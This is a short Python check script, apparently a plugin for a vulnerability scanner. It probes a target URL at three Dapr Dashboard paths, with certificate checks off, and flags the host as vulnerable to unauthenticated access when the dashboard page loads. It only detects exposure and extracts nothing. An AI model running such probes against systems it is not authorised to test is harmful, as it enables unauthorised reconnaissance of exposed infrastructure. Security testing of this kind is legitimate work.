#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Dapr Dashboard configurations 未授权访问漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/components/statestore','/overview','/controlplane']
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  # ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "<title>Dapr Dashboard</title>" in res.text:
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res2=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res2.status_code == 200 and "<title>Dapr Dashboard</title>" in res2.text:
      res2.close()
      ret['ifbug'] = True
      ret['url'] = url2
      return ret
  except:
    pass
  try:
    res3=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res3.status_code == 200 and "<title>Dapr Dashboard</title>" in res3.text:
      res3.close()
      ret['ifbug'] = True
      ret['url'] = url3
      return ret
    else:
      return ret
  except:
    return ret